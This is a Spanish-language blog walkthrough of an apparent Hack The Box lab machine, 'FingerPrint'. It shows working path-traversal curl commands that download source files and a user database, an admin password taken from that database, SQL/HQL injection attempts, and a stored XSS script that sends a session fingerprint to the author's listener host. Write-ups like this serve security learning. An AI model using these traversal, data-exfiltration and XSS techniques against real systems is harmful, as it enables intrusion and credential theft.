---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | FingerPrint        |
| Os                     | Windows            |
| Difficulty             | Insane             |
| Points                 | 0                  |
| IP                     | 10.10.11.127       |

## [](#header-2)Indice
Esta máquina es la primera Insane que haré, asi que intentaré explicar paso a paso el cómo se llegó a obtener las flags.

Estrenamos con esta máquina una herramienta, que se llama whichSystem.py, el cual nos muestra de acuerdo al ttl, el tipo de máquina al que nos encontramos y al mismo tiempo se verifica la conexión con la misma máquina.

![Reconocimiento](/assets/images/fingerprint/reconocimiento_fingerprint.png)

## [](#header-2)<a href="#desarrollo">Desarrollo</a>

En el primer escaneo con nmap, notamos que la máquina cuenta con 3 puertos abiertos, el de ssh, y 2 de tcp en los puertos 80, 8080.

![Reconocimiento](/assets/images/fingerprint/nmap1.png)

Procederemos a visitar las paginas para ver que contiene
`Página tcp 80`

![Page Overview](/assets/images/fingerprint/page_overview80.png)

`Página tcp 8080`
![Page Overview](/assets/images/fingerprint/page_overview8080.png)

Dentro de las páginas, también observamos que tienen paneles de loggin, los cuales procederemos a testearlos después de terminar el escaneo de la misma máquina.
`Página tcp 80 login panel`
![Login Panel](/assets/images/fingerprint/login80.png)

`Página tcp 8080 login panel`
![Login Panel](/assets/images/fingerprint/login8080.png)

El siguiente escaneo a la pagina, lo haremos con la herramienta feroxbuster, con el comando:

```s
feroxbuster -u http://10.10.11.127/ -B
```
La respuesta de codigo 200, significa que la pagina se puede visitar. EL codigo 302, significa que la pagina se redirige y la misma herramienta indica a donde.
![Login Panel](/assets/images/fingerprint/feroxbuster1.png)

Ahora, ya que al ingresar en /admin nos redirige a la pagina de inicio, procederemos a usar burpsuite, interceptamos el request de /admin antes de que lo redirija, damos click derecho en el response de la pagina y seleccionamos la opcion de Do intercept>Response to this request.

![Response 300](/assets/images/fingerprint/Response300.png)

Lo siguiente sera modificar el response, como lo muestro en la imagen siguiente.

![Response 200 fix](/assets/images/fingerprint/Response200.png)

Y al hacerlo, solo daremos click en Forward y podremos visualizar el contenido en el navegador.
![Response 200 browser](/assets/images/fingerprint/page200Response1.png)

Actualmente no hemos intentado hacer un login, asi que procederemos a introducir cualquier cosa en el log de la pagina del puerto 8080
![Response Invalid credentials](/assets/images/fingerprint/response_invalid_credentials.png)

Vemos que en la respuesta existe un fingerprint, no se que es exactamente, pero es bueno ir conociendo el flujo de la informacion.

La otra cosa que podemos testear es LFI credentially, modificaremos el request con /boot.log procederemos a entrar en burp, esta vez seleccionamos la opcion action > send to repeter

![Request modify](/assets/images/fingerprint/boot_log_request.png)

Una vez dentro de Repeter, solo daremos click en Send, para visualizar despues la respuesta. 

![Repeter test 1](/assets/images/fingerprint/view_fromRepeter.png)

La respuesta a esto muestra que no existe el path. Pero procederemos a injectar otro path con el tipico ../../../../../../etc/passwd

![Repeter test 2](/assets/images/fingerprint/repeter_test2.png)

Oh sorpresa, nos ha soltado todo, ahora sabemos el nombre de usuario, que es john con el id 1000, pero por este medio aun no podemos visualizar la primera flag.

![Repeter test 3](/assets/images/fingerprint/Repeter_test3.png)

Con esta respuesta, ahora sabemos que se esta usando python2.7 corriendo flask en el puerto 80.

![Repeter test 4](/assets/images/fingerprint/repeter_test4.png)

Con esta prueba, ahora sabemos que el proceso tiene el ID 1252

![Repeter test 5](/assets/images/fingerprint/repeter_test5.png)

Otra prueba interesante es en sched_debug y buscar los procesos que se llamen java.

Continuaremos ahora con otra herramienta que hemos usado antes `wfuzz`, quitaremos de la lista las palabras con 4 letras, por que en el response nos arroja error, con el comando:

```s
wfuzz -u http://10.10.11.127/admin/view../../../../../../proc/self/cwd/FUZZ.py -w /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt --hw 4
```

Ahora intentaremos hacer un XXS en el login del puerto 8080, inertando en el formulario del registro el script:

```s
<img src="http://10.10.14.230/"></img>
```

Y en la maquina Kali podemos hacer un:

```s
nc -lvnp 80
```
![Hit on Port 80](/assets/images/fingerprint/hitOn80.png)

Y como respuesta, vemos que alguien apunto al puerto 80

La siguiente prueba, sera con todo lo que ya sabemos, usaremos el comando `curl` para descargarnos la aplicacion, asi que crearemos una carpeta llamada src, para almacenar dentro lo que descargaremos. Si quitamos la parte de --path-as-is la herramienta no reconocera ../ y no encontrara la pagina solicitada, asi que el comando sera:

```s
curl --path-as-is http://10.10.11.127/admin/view/../../../../../../proc/self/cwd/app.py -o app.py
```

Para seguir conociendo mas sobre la aplicacion, tambien nos treremos

```s
curl --path-as-is http://10.10.11.127/admin/view/../../../../../../proc/self/cwd/auth.py -o auth.py
```

Ahora que sabemos donde esta la base de datos, la descargaremos

```s
curl --path-as-is http://10.10.11.127/admin/view/../../../../../../proc/self/cwd/users.db -o users.db
```

Y leemos la informacion con 

```s
sqlite3 users.db .dump
```

![Admin pswd](/assets/images/fingerprint/db_pwd.png)

Que nos presenta ahora? Pues la contrasena de admin! 
Entonces,volvemosa la aplicacion de puerto 80 e insertaremos estas credenciales.

![Using Admin pswd](/assets/images/fingerprint/admin_login.png)

Sin embargo en la pagina de puerto 8080, no son validas estas credenciales, asi que procederemos a intentar un SqlInjection.

![Simple Sqli](/assets/images/fingerprint/simple_sqli.png)

Muestro el response del simple sqli, antes de ser modificado, las siguientes capturas seran ya con el response modificado..

![Query sqli 1](/assets/images/fingerprint/query_sqli1.png)

En esta captura, vemos que tenemos como respuesta al sqli, que existen 2 posibles respuestas a la consulta, asi que procederemos a buscar el nombre del usuario.


Despues de esta investigacion, encontramos un dominio llamado asi que sera hora de tocar el archivo /etc/hosts

![etc/hosts modification](/assets/images/fingerprint/etc_hosts.png)

Crearemos un script, para poder obtener el fingerprint de la sesion de la pagina anterior:

```s
nano pwn.xss

#Y dentro del archivo

<script src="http://fingerprint.htb:8080/resources/js/login.js"> </script>
<script>
document.write("<img src=http://10.10.14.230/");
document.write(getFingerPrintID());
document.write("></img");
</script>
```

Este script sera el que usaremos para insertar en el formulario de la pagina con puerto 8080.


![Script steal](/assets/images/fingerprint/script_steal_cred.png)

Y ahora podemos abrir una shell con python

```s
sudo python3 -m http.server 80 
```

![Fingerprint captured](/assets/images/fingerprint/fingerprint_capture.png)

Tenemos ahora el fingerprint y podemos usarlo en el response, de la sigueinte manera

A continuacion, la muestra de la alerta del fingerprint invalido.

![Invalid Fingerprint](/assets/images/fingerprint/invalid_fingerprint.png)

Procederemos a copiar el capturado para pasar esta comprobacion.

![Response with 2 chars](/assets/images/fingerprint/response_2characteres.png)

En el siguiente response, podemos observar que el response, nos da como validos los 2 strings para el usuario que empieza con 'mi', existe una herramienta que nos puede dar esto facilmente, que es <a href="https://github.com/PaulSec/HQLmap.git">hqlmap</a>.

Ahora lo que podemos hacer, es que en el header del response. Podemos tomar el jwt token y decodificarlo para que nos muestre la informacion que contiene en ella, procederemos a guardarlo primero en un archivo llamado jwt.out. Ingresamos a la <a href="https://jwt.io/">pagina</a>

La respuesta que nos da jwt.io es la siguiente:

![jwt io](/assets/images/fingerprint/jwt_io.png)

El usuario se encuentra encriptado, pero al menos ya lo tenemos separado de los demas caracteres.

Para mostrar el contenido, ahora solo usaremos el siguiente comando, copiando el hash del usuario que tenemos encriptado.

```s
echo -n rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1 | base64 -d | strings
```

![User decrypted](/assets/images/fingerprint/user_decrypted.png)

Para evitarnos el trabajo de desencriptar la contrasena, podemos usar el mismo script que usamos para obtener el jwt con burpsuit e interceptar el request para meterlo ahi, y de esta manera pasar mas rapido. 

![User bypass](/assets/images/fingerprint/bypass_form.png)